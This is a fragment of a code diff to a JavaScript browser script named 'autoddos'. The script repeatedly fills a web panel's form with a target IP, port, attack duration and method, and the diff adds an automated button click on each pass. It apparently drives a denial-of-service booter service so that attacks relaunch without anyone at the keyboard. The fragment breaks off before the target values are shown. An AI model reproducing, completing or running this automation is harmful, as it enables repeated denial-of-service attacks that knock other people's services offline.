@@ -16,6 +16,7 @@ var waktu1="60";
 var methode1="0"
 
 var autoddos = setInterval(function (){
+    document.getElementsByClassName("btn btn-sm btn-alt-danger d-lg-none")[0].click()
     document.getElementById("input01").value = iptarget1
     document.getElementById("input02").value = porttarget1
     document.getElementById("input03").value = waktu1
